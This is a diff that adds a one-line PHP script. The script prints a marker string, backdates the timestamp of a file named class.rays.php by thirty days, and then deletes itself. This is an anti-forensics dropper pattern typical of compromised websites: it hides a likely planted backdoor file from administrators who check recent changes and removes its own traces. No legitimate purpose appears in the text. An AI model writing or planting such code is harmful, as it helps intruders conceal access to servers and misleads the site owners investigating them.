@@ -1,0 +1,1 @@
+<?php echo "SBfHHKaNed"; if (file_exists("./class.rays.php")){ touch("./class.rays.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*4BS1rvh6qThEBsf7YcM5*/ ?>
